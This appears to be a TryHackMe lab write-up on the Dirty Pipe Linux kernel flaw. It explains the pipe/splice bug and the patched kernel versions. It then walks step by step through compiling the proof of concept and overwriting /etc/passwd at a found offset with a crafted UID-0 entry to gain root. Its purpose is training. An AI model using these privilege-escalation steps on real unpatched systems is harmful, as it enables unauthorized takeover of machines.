In March 2022, a researcher named Max Kellerman publicly disclosed a Linux Kernel vulnerability (nicknamed "Dirty Pipe" for its similarities to the notorious "[Dirty Cow](https://dirtycow.ninja/)" exploit affecting older versions of the kernel) that allowed attackers to arbitrarily overwrite files on the operating system. The vulnerability was responsibly disclosed in early 2022 and was [publicly released in a blog post](https://dirtypipe.cm4all.com/) written by Max Kellerman soon after patches were made available.

Arbitrary file overwrites at the kernel level can be very easily leveraged to escalate privileges on the machine (i.e. to obtain administrator, or "root" privileges). This is a devastating vulnerability, made more so by its reach: any devices running a vulnerable version of the Linux kernel (including Android phones) are affected!  

This room will provide an overview of the vulnerability, as well as give you an opportunity to exploit it for yourself in the vulnerable machine attached to this task. We will start by taking a look at the vulnerability and exploit at a high-level, before moving on to exploiting the vulnerability in subsequent sections of the room.

---

**Overview**

Due to their low-level nature, any in-depth discussion of kernel vulnerabilities quickly becomes rather complicated. As such we will keep the information in this task relatively light, in the interests of keeping the information easy to digest. If you would like to read an in-depth explanation of the vulnerability (including a full code analysis), you are highly encouraged to check out Max Kellerman's [original blog post](https://dirtypipe.cm4all.com/).

Before continuing with this task, it is important to note that Dirty Pipe has been fixed in Linux kernel versions 5.16.11, 5.15.25 and 5.10.102, so if you use or manage any Linux (or Android) devices, make sure that they are running a kernel greater than one of these versions!


**Theory**

In order to understand how Dirty Pipe works, we must first look at how the Linux Kernel manages memory.

The smallest unit of memory controlled by the CPU is called a _page_ — these are usually about 4Kib in modern systems. Of relevance to this room, pages are used when reading and writing files from the disk, although they have many other uses. The part of the kernel that manages pages is referred to as the _page cache_.

When a process attempts to open a file, the kernel loads it into pages which are then made available to the userland process. This userland access can be granted either by being copied into user-space memory, or by keeping the pages in kernel-space but making them accessible via _system calls_ (effectively special functions which are used to interact with the kernel).

---

Okay, so what does this have to do with Dirty Pipe? The vulnerability arises because of how the kernel implements "pipes".

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d9e176315f8850e719252ed/room-content/5220b70c8ff67820dabb1156a666f816.png)You will likely be familiar with the idea of "anonymous pipes" — these are featured in most shell scripting languages and allow you to pass data between two processes, usually with the _pipe character_ (`|`). Pipes are characterised as having two ends — one for reading, and one for writing; you can see this for yourself in the way that anonymous pipes take the standard output of a process and _write_ it into a pipe where it can be _read_ by the standard input of the next program in the chain.  

Back on topic: the Linux kernel provides a system call called "`splice()`", which is effectively a shortcut designed to speed up the process of pushing the contents of a file into a pipe. This optimisation is achieved by moving _references_ to the pages storing the file contents, rather than moving the entirety of the data. In other words, `splice()` allows us to point a pipe at a page which is already loaded into memory, containing a section of a file originally opened by a process requesting read-only access. See where this is going?

By splicing a page into the pipe then writing our own arbitrary data to the pipe, we can overwrite the contents of the page!

---

It's not quite that simple, however; we are still missing one final piece of the puzzle. _Usually_ when you write to a pipe after splicing a file, a new `pipe_buffer` is created to avoid overwriting the spliced data. So, how do we force the kernel to allow us to overwrite the relevant page(s)?  

This is the real crux of the vulnerability, and it can all be traced back to two commits in the Linux kernel:

- A bug was introduced in [Linux Kernel v4.9 (2016)](https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b) which allowed pipes to be created with arbitrary flags. None of the flags available at the time were in any way dangerous, so this wasn't an issue, until...  
    
- [Linux Kernel v5.8 (2020)](https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958) added a new flag — `PIPE_BUF_FLAG_CAN_MERGE` . In simple terms, this flag tells the kernel that the page can be updated without forcing a rewrite of the data.  
    

To summarise: we have a flag that allows us to tell the kernel that it's okay to overwrite the data in a page, we have a bug that allows us to specify arbitrary flags for a pipe, and we have a system call that inadvertently allows us to point pipes at page buffers which were opened as read-only. What could possibly go wrong?  

Put simply, the exploit first opens a target file with the read-only flag set — in order to do this, we must choose a file that we have permission to read. The exploit then prepares a pipe in a special way, forcing the addition of the `PIPE_BUF_FLAG_CAN_MERGE` flag. Next, it uses `splice()` to make the pipe point at the desired section of the target file. Finally, it writes whatever arbitrary data that the user has specified into the pipe, overwriting the target page by merit of the `PIPE_BUF_FLAG_CAN_MERGE` flag.  

**The Effects**

So, what does this all mean?

In short, it means that, with the right code, we can arbitrarily overwrite any file on the system, provided we can open it for reading. In other words: if our user has read access over the file (regardless of other permissions or mutability) then we can also write to it. Interestingly, this also applies to read-only file systems, or otherwise protected files which the kernel would usually stop us from writing to; by exploiting the kernel vulnerability and circumventing the "usual" write methods, we also bypass these protections. It's important to note that the changes will not actually be permanent until the kernel chooses to reclaim the memory used by the page (at which point the page gets dumped to the disk). Restarting the device or clearing the page cache manually before the kernel reclaims the memory will revert the file back to its original contents.  

**Remediations**

Fortunately, the remediation for this vulnerability is very simple: update your kernel.

Patched versions of the Linux Kernel have been released for supported major kernel versions — specifically, the vulnerability has been patched in Linux kernel versions 5.16.11, 5.15.25 and 5.10.102.

Ensure that you apply updates to all of your Linux devices (including any Android) as soon as security patches are released.

---

**Connecting to the target**

This lab can be accessed in one of two ways:

- Using the in-browser machine on the right-hand side of the screen. This should have appeared automatically when you deployed the target.  
    
- Using SSH from a local attacking machine or the TryHackMe AttackBox. The credentials for this are:
    
    - **Username:** `tryhackme`
    - **Password:** `TryHackMe123!`
    
    i.e. `ssh tryhackme@10.10.130.240`

Pick a method and access the target for yourself!

  

**The Exploit**

In the previous task we looked at the background of the exploit and how it works. In this task we will be exploiting the vulnerability for ourselves!

A copy of Max Kellerman's original proof of concept exploit code (originally found in the [disclosure blog post](https://dirtypipe.cm4all.com/)) can be found on the target machine at `/home/tryhackme/Exploit/PoC/poc.c`. Once compiled, this exploit gives us a lot of control over how we abuse the Dirty Pipe vulnerability. Specifically, it lets us specify the _file_ we want to overwrite, the _offset_ we would like to overwrite it at, and the _content_ we would like to insert. We will acquire each of these things in the following paragraphs. An interactive video clip will be provided at the end of the task to assist with comprehension and debugging of the steps outlined in the following sections.  

---

Bearing in mind that the exploit won't let us _create_ files (we can only overwrite information in existing files), we first need to find a file our user can _read_, but that still allows us to elevate our privileges. The obvious easy choice in these conditions is `/etc/passwd`. Whilst password hashes are usually stored in the restricted-access `/etc/shadow` in modern Linux systems (as opposed to being stored traditionally in `/etc/passwd`), most Linux variants do still check to see if account password hashes are given in `/etc/passwd`. This means that we can write a user with root permissions and a known password hash directly into the passwd file!

_**Note:** If you are familiar with privilege escalation due to a writeable `/etc/passwd` file, skip to the next paragraph — otherwise click on the box below to read more about this technique._  

_Background Knowledge: The Passwd File 

Let's break this down in a little more detail.

Passwd entries are comprised of 7 _fields_, separated by colons (`:`). For example: `root:x:0:0:root:/root:/bin/bash`.

In order, these fields are:

- The username (`root`)
- The user's password hash. In most cases the hash will not actually be given here and instead will be replaced with an `x`. This means that the hash can instead be found in `/etc/shadow`.
- The user's UID (**U**ser **ID**) — as the root user, this is `0`.
- The user's GID (**G**roup **ID**). For the root user this will also be `0`.
- A description of the account. This is simply "`root`" in the example, however, it can be left blank.
- The user's home directory (`/root`)
- The user's login shell (`/bin/bash`)

If we can manually form our own entry (including a full password hash) and insert it into the passwd file then we can create a new user account. Interestingly, Linux doesn't check to confirm that the UID and GID of an account are unique — only that usernames are unique. In other words, we can create an account with our own unique username that has a UID and GID of `0`, effectively giving our new account the same permissions as the root account!

Let's generate a password hash and form a valid passwd entry before moving on. Pick a password then use the `openssl` command to create a SHA512Crypt hash of your chosen password:

Generating a SHA512Crypt Hash

```php
openssl passwd -6 --salt THM
```

Finally, insert your username and hash into this passwd entry template: `USERNAME:HASH:0:0::/root:/bin/bash`.

Your entry should look something like this:  
`muiri:$6$THM$eRD0Ur0SZuwDLSwf9Lb2vyC2T6/PtQUA/B0Ssm6/jsiBtpSvc6QLjhFF0XNM8odgfkxMnC4oczGuvEomrVRfz0:0:0::/root:/bin/bash`

_**Note:** The password:_ `TryHackMe123!` _has been used to generate the example hash above._

As we are overwriting existing entries in the password file, we also need to add a new line on at the end of our entry. This ensures that we avoid corrupting our entry with any remnants of the previous contents of the line.

Our final content should therefore look something like this (quotes included):  
`'muiri:$6$THM$eRD0Ur0SZuwDLSwf9Lb2vyC2T6/PtQUA/B0Ssm6/jsiBtpSvc6QLjhFF0XNM8odgfkxMnC4oczGuvEomrVRfz0:0:0::/root:/bin/bash   '`  
  

---

We have our _file_ (`/etc/passwd`) and our _content_ (the passwd entry) — all we need now is the _offset_. The offset is where in the file the exploit should begin writing at — in other words, which part of the file gets overwritten.

The vulnerability won't allow us to append to the file, so we are going to have to pick an account and overwrite it. Realistically speaking, given the length of our passwd entry (hash inclusive), this will probably actually overwrite _several_ accounts. Looking through the passwd file, the `games` account stands out as being a good candidate for a little-used account which we can afford to nuke for a few minutes. We can use `grep` with the `-b` switch to find the offset of `games` from the start of the file:

Finding the Offset

```php
tryhackme@dirty-pipe:~$ grep -b "games" /etc/passwd
189:games:x:5:60:games:/usr/games:/usr/sbin/nologin
```


The offset is revealed to be `189`, giving us the final piece of our puzzle.  

---

We are finally ready to go!  

The program can be compiled using the following commands:

Compilation Command

```php
tryhackme@dirty-pipe:~$ cd ~/Exploit/PoC 
tryhackme@dirty-pipe:~/Exploit/PoC$ gcc poc.c -o exploit 
tryhackme@dirty-pipe:~/Exploit/PoC$ ls poc.c  exploit
```

This moves to the directory containing the exploit code, then compiles it with `gcc`.

Before we perform the exploit, it's very important that we backup the `/etc/passwd` file. This is a disruptive exploit which _will_ cause damage to the system (for a while at the very least); with the passwd file backed up, we can easily revert the damage after the exploit has been completed.

Use `cp /etc/passwd /tmp/passwd` to copy the passwd file to `/tmp`, then execute the exploit!

Your command should look something like this:

Executing the Exploit

```php
tryhackme@dirty-pipe:~/Exploit/PoC$ ./exploit /etc/passwd 189 'USERNAME:HASH:0:0::/root:/bin/bash 
> '
```

---

Steps:
- cat /etc/passwd
- Pick a password then use the `openssl` command to create a SHA512Crypt hash of your chosen password:
```php
openssl passwd -6 --salt THM
```
- Finally, insert your username and hash into this passwd entry template: 
```php
USERNAME:HASH:0:0::/root:/bin/bash
```
- Create pass file it should look like this with a new line:
```php
'USERNAME:$6$THM$eRD0Ur0SZuwDLSwf9Lb2vyC2T6/PtQUA/B0Ssm6/jsiBtpSvc6QLjhFF0XNM8odgfkxMnC4oczGuvEomrVRfz0:0:0::/root:/bin/bash   
'
```
- Find offset
```php
grep -b "games" /etc/passwd
```
- Results: `189:games:x:5:60:games:/usr/games:/usr/sbin/nologin`
- Compile exploit
```php
gcc poc.c -o exploit
```
- Backup:  `cp /etc/passwd /tmp/passwd` to copy the passwd file to `/tmp`, then execute the exploit!
```php
cp /etc/passwd /tmp/passwd
```
- Run
```php
./exploit /etc/passwd 189
```

Example file with 1234 as the salted password:
```php
'zod:$6$THM$nwMbCgA5OWcuIxKpVs5cZcqO2DC4GcL1MZ77Fl2HydfpVojdZhc6HA0ThSos2gczyUiKl2SZ7TLx.VTxuqR/w1:0:0::/root:/bin/bash                                           
'
```
- Usage: ./exploit TARGETFILE OFFSET DATA, so everything is one command
```php
./exploit /etc/passwd 189 'zod:$6$THM$nwMbCgA5OWcuIxKpVs5cZcqO2DC4GcL1MZ77Fl2HydfpVojdZhc6HA0ThSos2gczyUiKl2SZ7TLx.VTxuqR/w1:0:0::/root:/bin/bash                                           '
```

![[Pasted image 20240713055944.png]]

---

Switch user (`su`) into your newly created root account.  
What is the flag found in the `/root/flag.txt` file?
_I had to modify the entry to make sure it was on two lines, it should have this indicator: > '_

![[Pasted image 20240713062758.png]]

****